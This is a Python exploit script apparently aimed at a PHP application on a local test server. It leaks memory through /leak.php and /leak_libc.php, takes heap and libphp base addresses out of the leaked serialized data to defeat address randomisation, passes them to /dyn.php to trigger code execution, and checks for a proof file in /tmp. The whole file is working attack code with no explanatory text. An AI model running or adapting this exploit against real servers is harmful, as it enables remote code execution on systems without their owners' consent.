#!/usr/bin/env python3
import urllib.request, re, struct, os, sys, time
from collections import Counter
BASE = os.environ.get('BASE', 'http://127.0.0.1:8088')
def get(path, timeout=15):
    return urllib.request.urlopen(BASE + path, timeout=timeout).read()
def parse775(buf):
    m = re.search(rb's:775:"', buf)
    if not m: raise RuntimeError('no 775 marker')
    p = buf[m.end():m.end()+775]
    c = Counter()
    for i in range(len(p)-7):
        v = struct.unpack_from('<Q', p, i)[0]
        if (v >> 48) == 0 and (((v >> 44) & 0xf) in (5,6,7)) and ((v >> 32) & 0xffff) != 0:
            c[v & ~0x1fffff] += 1
    if not c: raise RuntimeError('no heap ptrs')
    return c.most_common(1)[0][0]
def parse_libphp(buf):
    m = re.search(rb's:32768:"', buf)
    if not m: raise RuntimeError('no 32768 marker')
    p = buf[m.end():m.end()+32768]
    anchor = struct.unpack_from('<Q', p, 8168)[0]
    return anchor - 0x5b6309, anchor
try:
    a = get('/leak.php')
    hb = parse775(a)
    b = get('/leak_libc.php?mode=file_first')
    lb, anchor = parse_libphp(b)
    print('leakA_len', len(a), 'leakB_len', len(b))
    print('anchor', hex(anchor), 'hb', hex(hb), 'lb', hex(lb))
    try:
        r = get('/dyn.php?hb=%x&lb=%x' % (hb, lb), timeout=10)
        print('dyn resp len', len(r))
    except Exception as e:
        print('dyn request exception:', e)
    time.sleep(0.4)
    if os.path.exists('/tmp/x') and os.path.getsize('/tmp/x') > 0:
        print('PROOF:', open('/tmp/x').read().strip())
    else:
        print('NO PROOF')
except Exception as e:
    print('FAIL:', repr(e))
    sys.exit(1)
